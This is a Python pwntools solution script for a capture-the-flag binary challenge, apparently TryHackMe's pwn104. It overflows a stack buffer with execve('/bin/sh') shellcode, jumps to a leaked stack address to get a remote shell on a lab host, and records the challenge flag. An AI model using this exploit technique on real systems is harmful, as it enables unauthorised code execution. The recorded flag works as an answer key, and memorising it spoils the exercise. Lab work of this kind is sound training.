#!/usr/bin/env python3

from pwn import *

exe = './pwn104.pwn104'
elf = context.binary = ELF(exe,checksec=False)
context.log_level='debug'

#p = process()
p = remote('10.10.70.236',9004)

shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"

p.recv()
output = p.recv()
buffer_address = int(output.split(b'at')[1].strip().decode('utf-8'),16)

payload = shellcode + b"A"*(0x50 - len(shellcode)) +b"B" * 0x8 +p64(buffer_address)

p.sendline(payload)
p.interactive()

#Whenever we run the code, it tells us an address, a stack address that its leaking but everytime its different because ASLR is enabled, the address that is being leaked is the address of the user input
#flag : THM{0h_n0o0o0o_h0w_Y0u_Won??}
# need 2 p.recv() because if we check log_level we see that we are only recving the banner and not the leaked address for some reason so the second recv we get the leaked address
# b'\x\x\x' the b in front or byte specifier tells to interpret shellcode as bytes and not string 
# .split(b'at'), divide the received data into array of 2 elemenst divided by 'at' and we want the seond element that is the leaked address and .strip() to remove the whitespaces then convert it to integer from hex(16)
